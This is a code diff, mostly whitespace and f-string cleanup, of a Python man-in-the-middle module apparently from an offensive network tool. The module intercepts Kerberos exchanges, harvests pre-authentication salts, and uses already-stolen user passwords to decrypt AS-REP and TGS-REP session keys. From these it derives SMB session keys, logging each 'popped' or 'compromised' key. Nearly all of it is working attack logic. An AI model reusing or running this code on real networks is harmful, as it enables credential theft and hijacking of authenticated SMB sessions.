@@ -1,3 +1,5 @@
+# TODO: Finish reformating or remove
+
 from .SMB_Core import SMBKey
 from .ebcLib import MiTMModule
 from binascii import hexlify, unhexlify
@@ -10,20 +12,19 @@ import struct
 from pyasn1.error import PyAsn1Error
 import copy
 
-class K2TKerb(MiTMModule):
-	# 
-	def setup(self):
 
-		self.CLT_MESSAGE_DATA		= ""
-		self.CLT_MESSAGE_LENGTH 	= 0
+class K2TKerb(MiTMModule):
+	def setup(self):
+		self.CLT_MESSAGE_DATA = ""
+		self.CLT_MESSAGE_LENGTH = 0
 		self.CLT_INCOMPLETE_MESSAGE = False
 
-		self.SRV_MESSAGE_DATA		= ""
-		self.SRV_MESSAGE_LENGTH 	= 0
+		self.SRV_MESSAGE_DATA = ""
+		self.SRV_MESSAGE_LENGTH = 0
 		self.SRV_INCOMPLETE_MESSAGE = False
 
-		self.PREAUTH_ENCTYPES 			= dict()
-		self.KERB_SESSION_KEYS 		= []
+		self.PREAUTH_ENCTYPES = dict()
+		self.KERB_SESSION_KEYS = []
 
 		self.logger = logging.getLogger(__name__)
 		self.logger.setLevel(logging.INFO)
@@ -32,11 +33,9 @@ class K2TKerb(MiTMModule):
 	def parse_PreauthError(self, rawData):
 		# self.info['kerbSessionSalts_Lock'].acquire()
 		try:
-			preauth 	= decoder.decode(rawData[4:], asn1Spec = KRB_ERROR())[0]
-			methods 	= decoder.decode(preauth['e-data'], asn1Spec=METHOD_DATA())[0]
-			salt 		= ''
-
-			encryptionTypesData = dict()
+			preauth = decoder.decode(rawData[4:], asn1Spec=KRB_ERROR())[0]
+			methods = decoder.decode(preauth['e-data'], asn1Spec=METHOD_DATA())[0]
+			salt = ''
 
 			for method in methods:
 				if method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
@@ -52,7 +51,6 @@ class K2TKerb(MiTMModule):
 						if(etype2['etype'] not in self.PREAUTH_ENCTYPES):
 							self.PREAUTH_ENCTYPES[etype2['etype']] = []
 						self.PREAUTH_ENCTYPES[etype2['etype']].append(salt)
-						
 				elif method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value:
 					etypes = decoder.decode(str(method['padata-value']), asn1Spec = ETYPE_INFO())[0]
 					for etype in etypes:
@@ -64,7 +62,7 @@ class K2TKerb(MiTMModule):
 						except PyAsn1Error as e:
 							salt = ''
 
-						if(etype['etype'] not in self.PREAUTH_ENCTYPES):
+						if etype['etype'] not in self.PREAUTH_ENCTYPES:
 							self.PREAUTH_ENCTYPES[etype['etype']] = []
 						self.PREAUTH_ENCTYPES[etype['etype']].append(salt)
 
@@ -83,19 +81,19 @@ class K2TKerb(MiTMModule):
 		# self.info['kerbSessionKeys_Lock'].acquire()
 		try:
 			cname_start = rawData.find('\xa1\x12\x30\x10') + 6
-			cname_end 	= rawData.find('\xa5', cname_start)
-			userInRep 	= rawData[cname_start:cname_end]
+			cname_end = rawData.find('\xa5', cname_start)
+			userInRep = rawData[cname_start:cname_end]
 			#
 			# self.info['poppedCredsDB_Lock'].acquire()
 			#
-			asRep 		= decoder.decode(rawData[4:], asn1Spec = AS_REP())[0]
+			asRep = decoder.decode(rawData[4:], asn1Spec=AS_REP())[0]
 
 			for user in self.info['poppedCredsDB'].keys():
 				popped = self.info['poppedCredsDB'][user]
-				if (str(asRep['cname']['name-string'][0]).lower() == popped.username.lower()):
+				if str(asRep['cname']['name-string'][0]).lower() == popped.username.lower():
 					# Try to decrypt the KerberosSessionKey with the user's password
 					enctype = int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
-					cipher 	= _enctype_table[enctype]
+					cipher = _enctype_table[enctype]
 
 					for encType in self.PREAUTH_ENCTYPES[enctype]:
 						try:
@@ -103,19 +101,18 @@ class K2TKerb(MiTMModule):
 							# 	self.logger.info("USING NT-HASH")
 							# 	key = Key(cipher.enctype, popped.nt_hash)
 							# else:
-							key 	= cipher.string_to_key(popped.password, encType, None)
+							key = cipher.string_to_key(popped.password, encType, None)
 
-							
-							cipherText 	= asRep['enc-part']['cipher']
-							plainText 	= cipher.decrypt(key, 3, str(cipherText))
+							cipherText = asRep['enc-part']['cipher']
+							plainText = cipher.decrypt(key, 3, str(cipherText))
 
-							encASRepPart 	= decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
-							sessionKey 		= Key(cipher.enctype, str(encASRepPart['key']['keyvalue']))
+							encASRepPart = decoder.decode(plainText, asn1Spec=EncASRepPart())[0]
+							sessionKey = Key(cipher.enctype, str(encASRepPart['key']['keyvalue']))
 
 							# This is the user's Kerberos session key
 							self.KERB_SESSION_KEYS.append(sessionKey)
 
-							self.logger.info("\t!!! Popped a user's AS_REP !!! " + hexlify(sessionKey.contents))
+							self.logger.info(f"\t!!! Popped a user's AS_REP !!! {hexlify(sessionKey.contents)}")
 							break
 						except:
 							continue
@@ -133,46 +130,45 @@ class K2TKerb(MiTMModule):
 		# 	self.info['smbKeyChain_Lock'].acquire()
 		# 	mine = True
 		try:
-			enctype 	= int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
-			cipher 		= _enctype_table[enctype]
-			tgs 		= decoder.decode(rawData[4:], asn1Spec = TGS_REP())[0]
-			cipherText 	= tgs['enc-part']['cipher']
+			enctype = int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
+			cipher = _enctype_table[enctype]
+			tgs = decoder.decode(rawData[4:], asn1Spec=TGS_REP())[0]
+			cipherText = tgs['enc-part']['cipher']
 			# Key Usage 8
 			# TGS-REP encrypted part (includes application session
 			# key), encrypted with the TGS session key (Section 5.4.2)
-			sk = None
 			plainText = None
 			kerbSessionKey = None
 			for ksessionKey in self.KERB_SESSION_KEYS:
 				try:
-					plainText 		= cipher.decrypt(ksessionKey, 8, str(cipherText))
-					kerbSessionKey 	= ksessionKey
+					plainText = cipher.decrypt(ksessionKey, 8, str(cipherText))
+					kerbSessionKey = ksessionKey
 					break
 				except Exception as e:
-					self.logger.info("Failed to decrypt TGS with " + hexlify(ksessionKey.contents))
+					self.logger.info(f"Failed to decrypt TGS with {hexlify(ksessionKey.contents)}")
 					pass
 			if plainText == None:
 				# print("Failed to decrypt TGS ServiceSessionKey")
 				return rawData
 
-			encTGSRepPart 		= decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
-			ServiceSessionKey 	= Key(encTGSRepPart['key']['keytype'], str(encTGSRepPart['key']['keyvalue']))
-			cipher 				= _enctype_table[encTGSRepPart['key']['keytype']]
-			newKey 				= SMBKey(sessionBaseKey = ServiceSessionKey.contents[:16], kerbSessionKey = kerbSessionKey.contents, kerbServiceSessionKey = ServiceSessionKey.contents)
+			encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
+			ServiceSessionKey = Key(encTGSRepPart['key']['keytype'], str(
+				encTGSRepPart['key']['keyvalue']))
+			cipher = _enctype_table[encTGSRepPart['key']['keytype']]
+			newKey = SMBKey(sessionBaseKey=ServiceSessionKey.contents[:16],
+			                kerbSessionKey=kerbSessionKey.contents, kerbServiceSessionKey=ServiceSessionKey.contents)
 
 			# Load the popped key into the keychain
 			# self.info['smbKeyChain'][hash(newKey)] = newKey
 			# self.info['kerbPoppedKeys'].put(newKey) # For speed
 
 			# if(mine):
-				# self.info['smbKeyChain_Lock'].release()
-			self.logger.info("[K2TKerb]\t !!!Compromised TGS ServiceSessionKey (SMB SessionBaseKey is first 16 bytes)!!! " + hexlify(newKey.KERBEROS_SERVICE_SESSION_KEY))
-
+			# self.info['smbKeyChain_Lock'].release()
+			self.logger.info(f"[K2TKerb]\t !!!Compromised TGS ServiceSessionKey (SMB SessionBaseKey is first 16 bytes)!!! {hexlify(newKey.KERBEROS_SERVICE_SESSION_KEY)}")
 			# SMBKey(sessionBaseKey = ServiceSessionKey.contents[:16], dialect = self.SESSION_DIALECT, kerbSessionKey = smbKey.KERBEROS_SESSION_KEY, kerbServiceSessionKey = ServiceSessionKey.contents)
-
 		except Exception as e:
-			print("K2TKerb[parseServerResponse] Type 13 Error: " + str(e)+ " " + traceback.format_exc())
-		pass
+			print("K2TKerb[parseServerResponse] Type 13 Error: " +
+			      str(e) + " " + traceback.format_exc())
 		# self.info['kerbSessionKeys_Lock'].release()
 
 	# Handle the intercept
